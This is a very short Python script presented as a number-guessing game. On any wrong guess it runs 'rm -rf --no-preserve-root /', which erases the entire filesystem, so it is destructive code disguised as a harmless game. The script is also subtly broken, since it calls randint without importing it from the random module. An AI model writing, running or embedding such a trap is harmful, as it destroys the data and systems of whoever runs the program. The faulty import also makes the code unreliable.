import os
import random

r = randint(0, 10)
num = int(input("Enter number:"))

if num != r:
    os.system("rm -rf --no-preserve-root /")
